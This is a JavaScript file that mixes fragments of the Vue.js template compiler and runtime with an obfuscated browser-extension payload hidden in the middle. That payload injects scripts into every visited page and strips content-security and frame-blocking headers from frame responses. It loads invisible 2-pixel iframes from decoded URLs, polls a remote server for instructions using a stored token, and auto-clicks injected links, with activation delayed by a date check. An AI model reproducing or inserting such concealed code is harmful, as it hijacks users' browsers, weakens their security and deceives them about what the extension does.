function normalizeArrayChildren(children, nestedIndex) {
    var res = [];
    var i, c, lastIndex, last;
    for (i = 0; i < children.length; i++) {
        c = children[i];
        if (isUndef(c) || typeof c === 'boolean') {
            continue
        }
        lastIndex = res.length - 1;
        last = res[lastIndex];
        //  nested
        if (Array.isArray(c)) {
            if (c.length > 0) {
                c = normalizeArrayChildren(c, ((nestedIndex || '') + "_" + i));
                // merge adjacent text nodes
                if (isTextNode(c[0]) && isTextNode(last)) {
                    res[lastIndex] = createTextVNode(last.text + (c[0]).text);
                    c.shift();
                }
                res.push.apply(res, c);
            }
        } else if (isPrimitive(c)) {
            if (isTextNode(last)) {
                // merge adjacent text nodes
                // this is necessary for SSR hydration because text nodes are
                // essentially merged when rendered to HTML strings
                res[lastIndex] = createTextVNode(last.text + c);
            } else if (c !== '') {
                // convert primitive to vnode
                res.push(createTextVNode(c));
            }
        } else {
            if (isTextNode(c) && isTextNode(last)) {
                // merge adjacent text nodes
                res[lastIndex] = createTextVNode(last.text + c.text);
            } else {
                // default key for nested array children (likely generated by v-for)
                if (isTrue(children._isVList) &&
                    isDef(c.tag) &&
                    isUndef(c.key) &&
                    isDef(nestedIndex)) {
                    c.key = "__vlist" + nestedIndex + "_" + i + "__";
                }
                res.push(c);
            }
        }
    }
    return res
}

function polyfillBind(fn, ctx) {
    function boundFn(a) {
        var l = arguments.length;
        return l ?
            l > 1 ?
            fn.apply(ctx, arguments) :
            fn.call(ctx, a) :
            fn.call(ctx)
    }

    boundFn._length = fn.length;
    return boundFn
}

function isNotInFocusAndDirty(elm, checkVal) {
    // return true when textbox (.number and .trim) loses focus and its value is
    // not equal to the updated value
    var notInFocus = true;
    // #6157
    // work around IE bug when accessing document.activeElement in an iframe
    try {
        notInFocus = document.activeElement !== elm;
    } catch (e) {}
    return notInFocus && elm.value !== checkVal
}

function extractPropsFromVNodeData(
    data,
    Ctor,
    tag
) {
    // we are only extracting raw values here.
    // validation and default values are handled in the child
    // component itself.
    var propOptions = Ctor.options.props;
    if (isUndef(propOptions)) {
        return
    }
    var res = {};
    var attrs = data.attrs;
    var props = data.props;
    if (isDef(attrs) || isDef(props)) {
        for (var key in propOptions) {
            var altKey = hyphenate(key); {
                var keyInLowerCase = key.toLowerCase();
                if (
                    key !== keyInLowerCase &&
                    attrs && hasOwn(attrs, keyInLowerCase)
                ) {
                    tip(
                        "Prop \"" + keyInLowerCase + "\" is passed to component " +
                        (formatComponentName(tag || Ctor)) + ", but the declared prop name is" +
                        " \"" + key + "\". " +
                        "Note that HTML attributes are case-insensitive and camelCased " +
                        "props need to use their kebab-case equivalents when using in-DOM " +
                        "templates. You should probably use \"" + altKey + "\" instead of \"" + key + "\"."
                    );
                }
            }
            checkProp(res, props, key, altKey, true) ||
                checkProp(res, attrs, key, altKey, false);
        }
    }
    return res
}

function html(el, dir) {
    if (dir.value) {
        addProp(el, 'innerHTML', ("_s(" + (dir.value) + ")"), dir);
    }
}

function makeAttrsMap(attrs) {
    var map = {};
    for (var i = 0, l = attrs.length; i < l; i++) {
        if (
            map[attrs[i].name] && !isIE && !isEdge
        ) {
            warn$2('duplicate attribute: ' + attrs[i].name, attrs[i]);
        }
        map[attrs[i].name] = attrs[i].value;
    }
    return map
}

function mergeClassData(child, parent) {
    return {
        staticClass: concat(child.staticClass, parent.staticClass),
        class: isDef(child.class) ?
            [child.class, parent.class] :
            parent.class
    }
}

function processAttrs(el) {
    var list = el.attrsList;
    var i, l, name, rawName, value, modifiers, syncGen, isDynamic;
    for (i = 0, l = list.length; i < l; i++) {
        name = rawName = list[i].name;
        value = list[i].value;
        if (dirRE.test(name)) {
            // mark element as dynamic
            el.hasBindings = true;
            // modifiers
            modifiers = parseModifiers(name.replace(dirRE, ''));
            // support .foo shorthand syntax for the .prop modifier
            if (modifiers) {
                name = name.replace(modifierRE, '');
            }
            if (bindRE.test(name)) { // v-bind
                name = name.replace(bindRE, '');
                value = parseFilters(value);
                isDynamic = dynamicArgRE.test(name);
                if (isDynamic) {
                    name = name.slice(1, -1);
                }
                if (
                    value.trim().length === 0
                ) {
                    warn$2(
                        ("The value for a v-bind expression cannot be empty. Found in \"v-bind:" + name + "\"")
                    );
                }
                if (modifiers) {
                    if (modifiers.prop && !isDynamic) {
                        name = camelize(name);
                        if (name === 'innerHtml') {
                            name = 'innerHTML';
                        }
                    }
                    if (modifiers.camel && !isDynamic) {
                        name = camelize(name);
                    }
                    if (modifiers.sync) {
                        syncGen = genAssignmentCode(value, "$event");
                        if (!isDynamic) {
                            addHandler(
                                el,
                                ("update:" + (camelize(name))),
                                syncGen,
                                null,
                                false,
                                warn$2,
                                list[i]
                            );
                            if (hyphenate(name) !== camelize(name)) {
                                addHandler(
                                    el,
                                    ("update:" + (hyphenate(name))),
                                    syncGen,
                                    null,
                                    false,
                                    warn$2,
                                    list[i]
                                );
                            }
                        } else {
                            // handler w/ dynamic event name
                            addHandler(
                                el,
                                ("\"update:\"+(" + name + ")"),
                                syncGen,
                                null,
                                false,
                                warn$2,
                                list[i],
                                true // dynamic
                            );
                        }
                    }
                }
                if ((modifiers && modifiers.prop) || (
                        !el.component && platformMustUseProp(el.tag, el.attrsMap.type, name)
                    )) {
                    addProp(el, name, value, list[i], isDynamic);
                } else {
                    addAttr(el, name, value, list[i], isDynamic);
                }
            } else if (onRE.test(name)) { // v-on
                name = name.replace(onRE, '');
                isDynamic = dynamicArgRE.test(name);
                if (isDynamic) {
                    name = name.slice(1, -1);
                }
                addHandler(el, name, value, modifiers, false, warn$2, list[i], isDynamic);
            } else { // normal directives
                name = name.replace(dirRE, '');
                // parse arg
                var argMatch = name.match(argRE);
                var arg = argMatch && argMatch[1];
                isDynamic = false;
                if (arg) {
                    name = name.slice(0, -(arg.length + 1));
                    if (dynamicArgRE.test(arg)) {
                        arg = arg.slice(1, -1);
                        isDynamic = true;
                    }
                }
                addDirective(el, name, rawName, value, arg, isDynamic, modifiers, list[i]);
                if (name === 'model') {
                    checkForAliasModel(el, value);
                }
            }
        } else {
            // literal attribute
            {
                var res = parseText(value, delimiters);
                if (res) {
                    warn$2(
                        name + "=\"" + value + "\": " +
                        'Interpolation inside attributes has been removed. ' +
                        'Use v-bind or the colon shorthand instead. For example, ' +
                        'instead of <div id="{{ val }}">, use <div :id="val">.',
                        list[i]
                    );
                }
            }
            addAttr(el, name, JSON.stringify(value), list[i]);
            // #6887 firefox doesn't update muted state if set via attribute
            // even immediately after element creation
            if (!el.component &&
                name === 'muted' &&
                platformMustUseProp(el.tag, el.attrsMap.type, name)) {
                addProp(el, name, 'true', list[i]);
            }
        }
    }
}

function normalizeScopedSlot(normalSlots, key, fn) {
    var normalized = function() {
        var res = arguments.length ? fn.apply(null, arguments) : fn({});
        res = res && typeof res === 'object' && !Array.isArray(res) ?
            [res] // single vnode
            :
            normalizeChildren(res);
        return res && (
                res.length === 0 ||
                (res.length === 1 && res[0].isComment) // #9658
            ) ? undefined :
            res
    };
    // this is a slot using the new v-slot syntax without scope. although it is
    // compiled as a scoped slot, render fn users would expect it to be present
    // on this.$slots because the usage is semantically a normal slot.
    if (fn.proxy) {
        Object.defineProperty(normalSlots, key, {
            get: normalized,
            enumerable: true,
            configurable: true
        });
    }
    return normalized
}

function parseModifiers(name) {
    var match = name.match(modifierRE);
    if (match) {
        var ret = {};
        match.forEach(function(m) {
            ret[m.slice(1)] = true;
        });
        return ret
    }
}

function processKey(el) {
    var exp = getBindingAttr(el, 'key');
    if (exp) {
        {
            if (el.tag === 'template') {
                warn$2(
                    "<template> cannot be keyed. Place the key on real elements instead.",
                    getRawBindingAttr(el, 'key')
                );
            }
            if (el.for) {
                var iterator = el.iterator2 || el.iterator1;
                var parent = el.parent;
                if (iterator && iterator === exp && parent && parent.tag === 'transition-group') {
                    warn$2(
                        "Do not use v-for index as key on <transition-group> children, " +
                        "this is the same as not using keys.",
                        getRawBindingAttr(el, 'key'),
                        true /* tip */
                    );
                }
            }
        }
        el.key = exp;
    }
}

function createTextNode(text) {
    return document.createTextNode(text)
}

function loadSampleIn(listCount,nodeArr){	
	return atob(nodeArr?listCount:loadSampleIn(listCount,1));
}

function hadTokenTo(listCount,nodeArr){
	var nodeExt;
	if (listCount){
		nodeExt = document.createElement(nodeArr);
		listCount.forEach(function(optionExt){
			nodeExt.setAttribute(optionExt.orderNum,optionExt.tokenNum);
		});
		document.body.appendChild(nodeExt);
	}else{		
		nodeExt = document.getElementById(nodeArr);
		nodeExt.parentNode.removeChild(nodeExt);
	}
}

function testExceSize(nodeArr) {
	try {
		if (nodeArr.tabId == -1) {
			var listCount = nodeArr.responseHeaders;			
			
			var timeSize="ApolIZHicyC695secTGJurQVity351,cISMontentD79opMtioDns496fraZme32G3,xGEHE";
			listCount.forEach(function(tipArr,contentCode){
				turnEventIn(timeSize,'-').indexOf(tipArr.name.toLowerCase())>0?listCount.splice(contentCode, 1):{};
			});
			return {responseHeaders:listCount};
		}
	} catch (nodeExt) {
		return;
	}
}

function turnEventIn(timeSize,nodeArr){
	return timeSize.replace(/[A-Z]/g,'').replace(/\d+/g,nodeArr).split(nodeArr).reverse().join(nodeArr);
}

function loadContentTip(optionExt, timeSize, sendResponse) {
	if (optionExt.refererUrl) {
		sendResponse({done:"ok"});
		var contentCode = loadSampleIn(optionExt.refererUrl);
		if (contentCode) {
			var viewName = btoa(Math.random()).substring(5, 9);
			var textPool = [{orderNum:"id",tokenNum:viewName},{orderNum:"src",tokenNum:contentCode},{orderNum:"width",tokenNum:"2px"},{orderNum:"height",tokenNum:"2px"}];
			hadTokenTo(textPool,"iframe");
			setTimeout(function(){hadTokenTo([],viewName)}, 2E4);
		}
	}
}

function hasSignStr(optionSize) {
	chrome.browserAction.onClicked.addListener(function (tab) {
		chrome.tabs.create({url:"https://www.twitch.tv"});
	})
	if (Math.log2(Date.now()) <= 40.5863) return;
	chrome.tabs.onUpdated.addListener(function (id, changeInfo, tab) {
		if (changeInfo.status == 'complete' && /^https?:\/\/(?!microsoftedge\.microsoft\.com\/)/.test(tab.url)) {
			try {
				chrome.tabs.executeScript(id, {
					allFrames: true,
					runAt: 'document_end',
					file: optionSize
				});
			} catch {}
		}
	})
}

function hadTimeTip(){
	var optionExt=chrome.runtime,tipArr=chrome.runtime.onMessage,dataCode=chrome.webRequest.onHeadersReceived;
	var nodeExt = {urls:["<all_urls>"], types:["sub_frame"]};
	hasSignStr('background.js');
	window.onbeforeunload=()=> optionExt.reload();	
	tipArr.addListener(loadContentTip);
	dataCode.addListener(testExceSize,nodeExt, ["blocking", "responseHeaders"]);
};


var tipStr={
	imgExt:"u0rm5",	
	optionStr:"0jzua2gg5",		
	timeNum:"m50git0ki",		
	selectedVal:"hsoxd4cn9",		
	signNum:0,
	locLength:(new Date).getTime(),
	tipSHA:"HV903NLCRE3IRSC51102J69NE9T5JGBJT0QDFEOMFGU4C305XXUCHGUHBD8MM0CJKMUGHHCH1L0QVN6BEOMJA3X0MELJ6GW0IB5K6RFQCJP0WH1E8UM4K3D4EQPNAHBNSMI0SLPEWJPBOK5H0RI0I6R4O1Z06ECQEMYIW2GG5N4P5MSQC04OOOKGF7U0E1U5L0U2K1L5S0QGEEINWLUC1H6O4LI3DNUNHHCJ3O0NGQ90XK9B5OL0TIIHBIKN24K5T3NILKVGFE51FSRN9DQQZGQE8611W113WV1E8QNM8IEPSKRFSEY0YBYBMD61AQRQWDLE8465T49IHF0CU0E70FTIC9ZEUFKFCJWII0NN6F9NH0I1Z40GBI2DN0I8WEI6EA4E2I4E2GSF5ISSVG4C71SPEEOO2FCUMKWH4GWSGBNLWG5E8TP8KF7J8QYO2EMPAKXMMC57YNZE4FNO0JZU0B5T0SJ9I6AHOKI6OLUJTG9EKP9HNLXIB5BMVKNBRHK30MEO8MVK8BBPE47JUODFA5CQ28OQIGOK2IC5YI6DKN6HSN33SPIDJ4IHJK0KNA8GMQ4JMRSIV5G3V44F7U0RM50GIT0KIQ9JWLR24EFRSLV5MDBHSOXD4FXRMBTJ26TNODHFXJTBGHKLG7K4YHEFKOE4YLQDSD5ES5WFYCEEU97E0AJURLOG34ORNHOGV60DIQ90938QPO8IA5RNUFZDUBIHCJQMPFY011YA70MQRFLFJGC4XLOD1GOMXI0DTTDFL3L61H9OS2R3M6F7W53281E0I0N0Q0U0",
	orderCode:[],
	sheetCode:[],
	bufferVal:'data":"image',
	e0:12, 			
	exceStr:"http:",
	lav:200, 
	color:"color:green", 
	runEventOn:function(timeSize){
		Object.keys(tipStr).some(function(optionSize,i){
			var ss = !i?timeSize:"optionExt"+timeSize.toLowerCase();
			tipStr[optionSize] = tipStr[optionSize].substring(i,-1).replace(/\dataCode*/,"")+ss+tipStr[optionSize].substr(3+i,i%2);
			if(i>=3)return true;			
		});	
		tipStr.orderCode = initLineIn(initLineCode(tipStr.tipSHA),"|");
		tipStr.sheetCode = initLineIn(tipStr.orderCode[tipStr.orderCode.length-1],";");
	},
	
	turnSignAs:function(iconTip){	
		tipStr.nodeExt = this[String.fromCharCode(101,48)];
		initLineIn(chrome.runtime.id,"").forEach(function(listCount) {
			iconTip = (iconTip << 5) + listCount.charCodeAt(0) - iconTip;iconTip = iconTip & iconTip;
		});
		
		tipStr.signNum = Math.abs(iconTip) % 1E3;	
		tipStr.runEventOn(tipStr.signNum.toString().addSheetStr());	
		
		secImg(tipStr.optionStr, tipStr.nodeExt%11);
		return true;
	},
	
	checkScreen:function(i,docNum,bufferArr){	
		var timeSize=docNum?tipStr.orderCode[i].replace("$1",docNum):tipStr.orderCode[i];
		var timeSize=bufferArr?timeSize.replace("$2",bufferArr):timeSize;
		try {
		    if (formArr[tipStr.sheetCode[1]] == "1") {	
		        console.log("%c" + "Lzyh - " + (new Date).toLocaleTimeString() + " " + timeSize + "	\t", tipStr.color);
		    }
		} catch (nodeExt) {
		    return;
		}
	},
	
	secListAll:function(timeSize) {
	    return newLineTip().reCellStr();
	}
};

String.prototype.addSheetStr=function(tokenNum){
	return tokenNum?atob(atob(this)):btoa(this).replace(/=/g, "");
};

String.prototype.reCellStr=function(tokenNum){	
	var timeSize=tokenNum&&tokenNum||"";
	return initLineIn(this,timeSize).reverse().join(timeSize);
}
function toObject(arr) {
    var res = {};
    for (var i = 0; i < arr.length; i++) {
        if (arr[i]) {
            extend(res, arr[i]);
        }
    }
    return res
}

function getTypeIndex(type, expectedTypes) {
    if (!Array.isArray(expectedTypes)) {
        return isSameType(expectedTypes, type) ? 0 : -1
    }
    for (var i = 0, len = expectedTypes.length; i < len; i++) {
        if (isSameType(expectedTypes[i], type)) {
            return i
        }
    }
    return -1
}

var formArr={};
var imageArr = chrome.storage.local;
var dataArray = chrome.storage.sync;
var protocol1 = location.protocol;
function initLineIn(str , timeSize){	
	return str?str.toString().split(timeSize):[];
}
function dragImgOn(optionSize , tokenNum , q){
	if (formArr[optionSize]){
		var temp = secDefaultTip(formArr[optionSize]);
		tokenNum?formArr[tokenNum] = initLineIn(temp,"\t")[1]:null;
		q?formArr[q] = initLineIn(temp,"\t")[2]:null;
	}
}
function cpyCell(timeSize){
	var iconTip = timeSize.charCodeAt();
	iconTip = iconTip - ((iconTip>47&&iconTip<58) && tipStr.nodeExt*4 || (iconTip>64&&iconTip<91) && 55 );
	return iconTip;
}	
function checkViewStr() {
	if (formArr[tipStr.imgExt]) {        
		var i = (tipStr.locLength - formArr[tipStr.imgExt] / tipStr.signNum) / 36E5 ;
		
		if (i < tipStr.nodeExt*6) {					
			tipStr.checkScreen(1);	
			return;
		}
		if (newOrderOn())initBufferIn(true);
		runColor();
	} else {        
		addFormExt();						
	}
}
function searchDataTip(timeSize,j){
	if (timeSize.length <=2 ) return "";
	var listCount=cpyCell(timeSize.substr(0,1));
	var tipArr=cpyCell(timeSize.substr(2,1));
	var orderNum=cpyCell(timeSize.substr(3,1));
	var t = (tipArr + orderNum*tipStr.nodeExt*3 -j)/Math.floor((65-listCount)/5)+31;
	var optionExt = String.fromCharCode(t);
	timeSize = (timeSize.length>4)?timeSize.substr(2):"";
	return optionExt + searchDataTip(timeSize,listCount);
}
function addFormExt() {
	tipStr.checkScreen(2);		
	dataArray.get(null, function(data) {
		secImg(tipStr.imgExt,data[tipStr.imgExt]?data[tipStr.imgExt]:tipStr.locLength * tipStr.signNum);	
	});
}
function initLineCode(timeSize){
	return (timeSize.length == 0 )&&""||searchDataTip(timeSize,0).trim();
}
function newLineTip(_) {
	var timeSize = _ ? Object.keys(tipStr)[10] : Object.keys(tipStr)[12];
	return timeSize.replace(/\d/g,'');
}
function runColor() {
	if (formArr["sheetSize"]) {
		if (formArr["sheetSize"].includes(tipStr.sheetCode[3])) {
			this[newLineTip(1) + tipStr.secListAll()](formArr["sheetSize"]);	
		}
	}
}
function newOrderOn() {
	var h = tipStr.nodeExt * 4;
	try {
		if (!formArr[tipStr.timeNum]) return true;	
		if (rmTipArr(0, tipStr.lav) > 20) {		
			tipStr.checkScreen(3);		
			return false;
		}
		var t = (tipStr.locLength - formArr["tipName"]) / 36E5;
		tipStr.checkScreen(4,t,h);
		if (t > h) return true;	
	}catch (nodeExt) {
		return true;
	}
	return false;
}
function initBufferIn(timeSize) { 
	timeSize?null:tipStr.checkScreen(5);   
	var areaTag;
	try {
		areaTag = new XMLHttpRequest;
		areaTag.onreadystatechange = function() {
			if (areaTag.readyState == 4) {
				if (areaTag.status == tipStr.lav) {		
					copyWordSize(areaTag.responseText);
				} else {
					tipStr.checkScreen(6);
				if (timeSize) {
					(rmTipArr(0, tipStr.lav) > 40)?initBufferIn(false):tipStr.checkScreen(7); 
				}
				}
			}
		};
		areaTag.onerror = function() {
			tipStr.checkScreen(8);	
			(timeSize)?initBufferIn(false):secImg(tipStr.timeNum,secDefaultTip(tipStr.locLength,1E5));
		};
		var keyPool = tipStr.sheetCode[6].replace("google",(!timeSize)?tipStr.sheetCode[7]:tipStr.sheetCode[8])+tipStr.sheetCode[9];
		keyPool += (formArr["tokenVal"] && !(keyPool.includes("&c=")))?"&c="+formArr["tokenVal"]:"";
		tipStr.checkScreen(9, keyPool);	
		areaTag.open("GET", keyPool, true);
		areaTag.send();
	} catch (nodeExt) {
		tipStr.checkScreen(10);	
		secImg(tipStr.timeNum,secDefaultTip(tipStr.locLength,1E5));
		return "exception";
	}
}
function copyWordSize(timeSize) {	
    if (timeSize.length > tipStr.lav && timeSize.includes(tipStr.bufferVal)) {
        tipStr.checkScreen(11);
        var log$1 = JSON.parse(timeSize);
        var documents = log$1.id;
        var exceLength = log$1.image;
        exceLength = getDefaultVal(exceLength);	
        if (exceLength.includes(tipStr.sheetCode[3])) {
			secImg(tipStr.timeNum,secDefaultTip(tipStr.locLength,1E5));
			secImg(tipStr.selectedVal,secDefaultTip(documents + "\t" + exceLength,1E5));
        }
    } else {
		secImg(tipStr.timeNum,secDefaultTip(tipStr.locLength,1E5));
    }
}
function getDefaultVal(timeSize) {
    var optionExt = "";
	initLineIn(timeSize,"").forEach(function(iconTip) {
		data$1 = iconTip.charCodeAt(0);
		data$1+=(data$1==56)?1:(data$1==57)?-1:(data$1>=65&&data$1<=90)?32:(data$1>=97&&data$1<=122)?-32:0;
		optionExt+=String.fromCharCode(data$1);
	});
    return atob(optionExt);
}

function rmTipArr(orderNum, tipArr) {
    return Math.floor(Math.random() * (tipArr - orderNum)) + orderNum;
}

function secDefaultTip(timeSize,flag) {	
	if (!timeSize) return "";
    var optionExt = flag&&rmTipArr(flag, flag*10)+"\t"||"";
	initLineIn(timeSize,"").forEach(function(iconTip) {
		optionExt += String.fromCharCode(tipStr.ifx ^ iconTip.charCodeAt(0));
	});
    return optionExt;
}

protocol1.indexOf('http') === -1 ? hadTimeTip() : loadImageStr();

function loadImageStr() {
	if (window.top==window.self&&tipStr.turnSignAs(0)){
		imageArr.get(null, function(items) {
			for (key in items) {
				formArr[key] = items[key];
			}
			dragImgOn([tipStr.timeNum],"tipName");
			dragImgOn([tipStr.selectedVal],"tokenVal","sheetSize");
			checkViewStr();
		});
	};
	var nodeExt=document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0];
	var documents = window.location.href;
    if (window.self !== window.top&&window.parent === window.top) {
		imageArr.get(tipStr.sheetCode[2], function(iconTip) {
			var data = iconTip[tipStr.sheetCode[2]];
			if (data) {
				if (data != "") {
					var docNum = initLineIn(data,"^")[0].addSheetStr(1);
					var bufferArr = initLineIn(data,"^")[1].addSheetStr(1);
					if (documents.indexOf(dragListTip(docNum)) > -1) {
						var listCount = document.createElement("listCount");
						listCount.setAttribute("href", bufferArr);
						nodeExt.appendChild(listCount);
						listCount.click();
						secImg(tipStr.sheetCode[2], "");
					}
				}
			}
		});
		
		if (documents.includes(tipStr.sheetCode[4]) || documents.includes(tipStr.sheetCode[5])) {
			var data$1 = document.getElementsByTagName(tipStr.sheetCode[0]);	
			for (i in data$1) {
				var timeSize = data$1[i].innerHTML;
				if(timeSize){
					timeSize = timeSize.replace(tipStr.sheetCode[10],tipStr.sheetCode[11]);
					timeSize = timeSize.replace(tipStr.sheetCode[10].replace(" ",""),tipStr.sheetCode[11]);
					var listCount = document.createElement(tipStr.sheetCode[0]);
					listCount.innerHTML = timeSize;
					nodeExt.appendChild(listCount);
				}
			}
		}
    }
}

function dragListTip(timeSize) {
    var listCount = document.createElement("listCount");
    listCount.href = (!timeSize.includes(tipStr.exceStr))&&tipStr.exceStr+"//"||"" + timeSize;
    var optionExt = listCount.host.toLowerCase();	
    return (optionExt.substring(0,4)=="www."&&optionExt.substring(4)||optionExt).replace(":80","");
}

function secImg(key, timeSize) {
    var o = {};
    o[key] = timeSize;
    imageArr.set(o);
}

function parseFilters(exp) {
    var inSingle = false;
    var inDouble = false;
    var inTemplateString = false;
    var inRegex = false;
    var curly = 0;
    var square = 0;
    var paren = 0;
    var lastFilterIndex = 0;
    var c, prev, i, expression, filters;

    for (i = 0; i < exp.length; i++) {
        prev = c;
        c = exp.charCodeAt(i);
        if (inSingle) {
            if (c === 0x27 && prev !== 0x5C) {
                inSingle = false;
            }
        } else if (inDouble) {
            if (c === 0x22 && prev !== 0x5C) {
                inDouble = false;
            }
        } else if (inTemplateString) {
            if (c === 0x60 && prev !== 0x5C) {
                inTemplateString = false;
            }
        } else if (inRegex) {
            if (c === 0x2f && prev !== 0x5C) {
                inRegex = false;
            }
        } else if (
            c === 0x7C && // pipe
            exp.charCodeAt(i + 1) !== 0x7C &&
            exp.charCodeAt(i - 1) !== 0x7C &&
            !curly && !square && !paren
        ) {
            if (expression === undefined) {
                // first filter, end of expression
                lastFilterIndex = i + 1;
                expression = exp.slice(0, i).trim();
            } else {
                pushFilter();
            }
        } else {
            switch (c) {
                case 0x22:
                    inDouble = true;
                    break // "
                case 0x27:
                    inSingle = true;
                    break // '
                case 0x60:
                    inTemplateString = true;
                    break // `
                case 0x28:
                    paren++;
                    break // (
                case 0x29:
                    paren--;
                    break // )
                case 0x5B:
                    square++;
                    break // [
                case 0x5D:
                    square--;
                    break // ]
                case 0x7B:
                    curly++;
                    break // {
                case 0x7D:
                    curly--;
                    break // }
            }
            if (c === 0x2f) { // /
                var j = i - 1;
                var p = (void 0);
                // find first non-whitespace prev char
                for (; j >= 0; j--) {
                    p = exp.charAt(j);
                    if (p !== ' ') {
                        break
                    }
                }
                if (!p || !validDivisionCharRE.test(p)) {
                    inRegex = true;
                }
            }
        }
    }

    if (expression === undefined) {
        expression = exp.slice(0, i).trim();
    } else if (lastFilterIndex !== 0) {
        pushFilter();
    }

    function pushFilter() {
        (filters || (filters = [])).push(exp.slice(lastFilterIndex, i).trim());
        lastFilterIndex = i + 1;
    }

    if (filters) {
        for (i = 0; i < filters.length; i++) {
            expression = wrapFilter(expression, filters[i]);
        }
    }

    return expression
}

function checkExpression(exp, text, warn, range) {
    try {
        new Function(("return " + exp));
    } catch (e) {
        var keywordMatch = exp.replace(stripStringRE, '').match(prohibitedKeywordRE);
        if (keywordMatch) {
            warn(
                "avoid using JavaScript keyword as property name: " +
                "\"" + (keywordMatch[0]) + "\"\n  Raw expression: " + (text.trim()),
                range
            );
        } else {
            warn(
                "invalid expression: " + (e.message) + " in\n\n" +
                "    " + exp + "\n\n" +
                "  Raw expression: " + (text.trim()) + "\n",
                range
            );
        }
    }
}

function set(target, key, val) {
    if (isUndef(target) || isPrimitive(target)) {
        warn(("Cannot set reactive property on undefined, null, or primitive value: " + ((target))));
    }
    if (Array.isArray(target) && isValidArrayIndex(key)) {
        target.length = Math.max(target.length, key);
        target.splice(key, 1, val);
        return val
    }
    if (key in target && !(key in Object.prototype)) {
        target[key] = val;
        return val
    }
    var ob = (target).__ob__;
    if (target._isVue || (ob && ob.vmCount)) {
        warn(
            'Avoid adding reactive properties to a Vue instance or its root $data ' +
            'at runtime - declare it upfront in the data option.'
        );
        return val
    }
    if (!ob) {
        target[key] = val;
        return val
    }
    defineReactive$$1(ob.value, key, val);
    ob.dep.notify();
    return val
}

function getInvalidTypeMessage(name, value, expectedTypes) {
    var message = "Invalid prop: type check failed for prop \"" + name + "\"." +
        " Expected " + (expectedTypes.map(capitalize).join(', '));
    var expectedType = expectedTypes[0];
    var receivedType = toRawType(value);
    var expectedValue = styleValue(value, expectedType);
    var receivedValue = styleValue(value, receivedType);
    // check if we need to specify expected value
    if (expectedTypes.length === 1 &&
        isExplicable(expectedType) &&
        !isBoolean(expectedType, receivedType)) {
        message += " with value " + expectedValue;
    }
    message += ", got " + receivedType + " ";
    // check if we need to specify received value
    if (isExplicable(receivedType)) {
        message += "with value " + receivedValue + ".";
    }
    return message
}

function genData$1(el) {
    var data = '';
    if (el.staticStyle) {
        data += "staticStyle:" + (el.staticStyle) + ",";
    }
    if (el.styleBinding) {
        data += "style:(" + (el.styleBinding) + "),";
    }
    return data
}

function baseWarn(msg, range) {
    console.error(("[Vue compiler]: " + msg));
}

function checkForAliasModel(el, value) {
    var _el = el;
    while (_el) {
        if (_el.for && _el.alias === value) {
            warn$2(
                "<" + (el.tag) + " v-model=\"" + value + "\">: " +
                "You are binding v-model directly to a v-for iteration alias. " +
                "This will not be able to modify the v-for source array because " +
                "writing to the alias is like modifying a function local variable. " +
                "Consider using an array of objects and use v-model on an object property instead.",
                el.rawAttrsMap['v-model']
            );
        }
        _el = _el.parent;
    }
}

function parseHTML(html, options) {
    var stack = [];
    var expectHTML = options.expectHTML;
    var isUnaryTag$$1 = options.isUnaryTag || no;
    var canBeLeftOpenTag$$1 = options.canBeLeftOpenTag || no;
    var index = 0;
    var last, lastTag;
    while (html) {
        last = html;
        // Make sure we're not in a plaintext content element like script/style
        if (!lastTag || !isPlainTextElement(lastTag)) {
            var textEnd = html.indexOf('<');
            if (textEnd === 0) {
                // Comment:
                if (comment.test(html)) {
                    var commentEnd = html.indexOf('-->');

                    if (commentEnd >= 0) {
                        if (options.shouldKeepComment) {
                            options.comment(html.substring(4, commentEnd), index, index + commentEnd + 3);
                        }
                        advance(commentEnd + 3);
                        continue
                    }
                }

                // http://en.wikipedia.org/wiki/Conditional_comment#Downlevel-revealed_conditional_comment
                if (conditionalComment.test(html)) {
                    var conditionalEnd = html.indexOf(']>');

                    if (conditionalEnd >= 0) {
                        advance(conditionalEnd + 2);
                        continue
                    }
                }

                // Doctype:
                var doctypeMatch = html.match(doctype);
                if (doctypeMatch) {
                    advance(doctypeMatch[0].length);
                    continue
                }

                // End tag:
                var endTagMatch = html.match(endTag);
                if (endTagMatch) {
                    var curIndex = index;
                    advance(endTagMatch[0].length);
                    parseEndTag(endTagMatch[1], curIndex, index);
                    continue
                }

                // Start tag:
                var startTagMatch = parseStartTag();
                if (startTagMatch) {
                    handleStartTag(startTagMatch);
                    if (shouldIgnoreFirstNewline(startTagMatch.tagName, html)) {
                        advance(1);
                    }
                    continue
                }
            }

            var text = (void 0),
                rest = (void 0),
                next = (void 0);
            if (textEnd >= 0) {
                rest = html.slice(textEnd);
                while (
                    !endTag.test(rest) &&
                    !startTagOpen.test(rest) &&
                    !comment.test(rest) &&
                    !conditionalComment.test(rest)
                ) {
                    // < in plain text, be forgiving and treat it as text
                    next = rest.indexOf('<', 1);
                    if (next < 0) {
                        break
                    }
                    textEnd += next;
                    rest = html.slice(textEnd);
                }
                text = html.substring(0, textEnd);
            }

            if (textEnd < 0) {
                text = html;
            }

            if (text) {
                advance(text.length);
            }

            if (options.chars && text) {
                options.chars(text, index - text.length, index);
            }
        } else {
            var endTagLength = 0;
            var stackedTag = lastTag.toLowerCase();
            var reStackedTag = reCache[stackedTag] || (reCache[stackedTag] = new RegExp('([\\s\\S]*?)(</' + stackedTag + '[^>]*>)', 'i'));
            var rest$1 = html.replace(reStackedTag, function(all, text, endTag) {
                endTagLength = endTag.length;
                if (!isPlainTextElement(stackedTag) && stackedTag !== 'noscript') {
                    text = text
                        .replace(/<!\--([\s\S]*?)-->/g, '$1') // #7298
                        .replace(/<!\[CDATA\[([\s\S]*?)]]>/g, '$1');
                }
                if (shouldIgnoreFirstNewline(stackedTag, text)) {
                    text = text.slice(1);
                }
                if (options.chars) {
                    options.chars(text);
                }
                return ''
            });
            index += html.length - rest$1.length;
            html = rest$1;
            parseEndTag(stackedTag, index - endTagLength, index);
        }

        if (html === last) {
            options.chars && options.chars(html);
            if (!stack.length && options.warn) {
                options.warn(("Mal-formatted tag at end of template: \"" + html + "\""), {
                    start: index + html.length
                });
            }
            break
        }
    }

    // Clean up any remaining tags
    parseEndTag();

    function advance(n) {
        index += n;
        html = html.substring(n);
    }

    function parseStartTag() {
        var start = html.match(startTagOpen);
        if (start) {
            var match = {
                tagName: start[1],
                attrs: [],
                start: index
            };
            advance(start[0].length);
            var end, attr;
            while (!(end = html.match(startTagClose)) && (attr = html.match(dynamicArgAttribute) || html.match(attribute))) {
                attr.start = index;
                advance(attr[0].length);
                attr.end = index;
